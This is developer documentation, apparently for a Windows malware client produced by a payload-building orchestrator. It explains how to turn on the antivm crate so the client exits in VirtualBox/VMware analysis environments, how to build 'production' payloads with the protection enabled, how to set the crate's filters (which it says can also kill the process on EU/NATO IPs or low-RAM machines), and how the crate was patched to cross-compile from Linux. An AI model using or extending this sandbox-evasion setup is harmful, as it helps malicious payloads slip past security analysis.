# Anti-VM protection (`antivm` feature)

The client can bundle the [`antivm`](https://github.com/northernboykisser/anti-vm-rust)
library to terminate in unwanted environments (VirtualBox/VMware, etc.). The protection is
optional, controlled by a **compile-time feature**, so development builds compile and run
without it.

## Feature flag

Defined in `crates/client/Cargo.toml`:

```toml
[features]
default = ["antivm"]
antivm = ["dep:antivm"]

[target.'cfg(windows)'.dependencies]
antivm = { version = "1.2", optional = true }
```

- **Default (production)**: the `antivm` feature is **on**. Protection is invoked at the start
  of the client `main`, but only takes effect on the **Windows target** (the gate is
  `#[cfg(all(windows, feature = "antivm"))]`).
- **Off (development/testing)**: build with `--no-default-features` to exclude the `antivm`
  crate and the protection call.

```bash
# production (antivm on) — direct cargo
cargo build -p client --release --target x86_64-pc-windows-gnu

# development (antivm off)
cargo build -p client --no-default-features
cargo build -p client --no-default-features --target x86_64-pc-windows-gnu
```

The orchestrator (`server new-build`) compiles the client with default features (antivm on). To
produce a test client without antivm through the orchestrator, use the `--no-antivm` flag:

```bash
./target/release/server new-build --artifact payload.txt --uid dev --no-antivm \
  --target x86_64-pc-windows-gnu
```

## Filter configuration

The call in `crates/client/src/main.rs` enables only the VM filter and disables the rest
(IP/geo, HTTP, network, resolution, CPU, RAM), because the crate defaults terminate the process
on ordinary machines/networks (e.g. an EU/NATO country IP, or less than 4 GB of RAM). Adjust the
`set_*` calls as needed:

```rust
antivm::ProtectionBuilder::new()
    .set_vm(true)
    .set_ip(false)
    .set_http(false)
    .set_network(false)
    .set_screen(false)
    .set_cpu(false)
    .set_ram(false)
    .init();
```

## Patched local copy (vendor)

`antivm` 1.2.0 does not cross-compile from a Linux host: the crate's original `build.rs` has a
top-level `use winapi::um::winuser::*;`, and build scripts compile for the **host** — the
`winapi::um` module only exists on a Windows host.

The crate is therefore used from a local copy in `vendor/antivm/`, redirected via
`[patch.crates-io]` in the root `Cargo.toml`. The only change from upstream is wrapping the
WinAPI use in `build.rs` inside a `#[cfg(windows)]` block, so the build script compiles on a
Linux host (cross-compiling the Windows target) without changing behavior on a Windows host.
